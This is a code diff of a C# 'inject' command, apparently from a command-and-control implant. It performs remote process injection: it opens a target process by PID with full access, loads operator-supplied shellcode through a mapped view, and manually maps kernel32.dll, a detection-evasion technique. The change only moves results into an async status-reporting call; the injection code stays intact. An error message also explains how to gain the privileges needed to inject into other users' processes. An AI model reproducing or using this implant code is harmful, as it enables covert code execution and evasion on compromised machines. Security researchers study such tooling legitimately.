@@ -1,5 +1,6 @@
 ﻿using Engineer.Commands;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -17,20 +18,22 @@ namespace Engineer.Commands
     {
         public override string Name => "inject";
         private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try 
             {
                 if (task.File.Length < 1)
                 {
-                    return "No shellcode provided";
+                    Tasking.FillTaskResults("No shellcode provided",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
                 //convert from base64 string to byte array
                 byte[] shellcode = task.File;
 
                 if (!task.Arguments.TryGetValue("/pid", out string pid))
                 {
-                    return "No pid provided";
+                    Tasking.FillTaskResults("No pid provided",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
                 int pidInt = int.Parse(pid.TrimStart(' '));
                 var processToInject = Process.GetProcessById(pidInt);
@@ -38,13 +41,14 @@ namespace Engineer.Commands
                 IntPtr processPointer = WinAPIs.Kernel32.OpenProcess(WinAPIs.Kernel32.ProcessAllFlags, false, pidInt);
                 if (MapViewLoadShellcode(shellcode, processPointer))
                 {
-                    return "process injected";
+                    Tasking.FillTaskResults("process injected",task,EngTaskStatus.Complete);
+                    return;
                 }
-                return "Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs";
+                Tasking.FillTaskResults("Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs",task,EngTaskStatus.FailedWithWarnings);
             }
             catch(Exception e)
             {
-                return e.Message;
+                Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed);
             }
         }
 
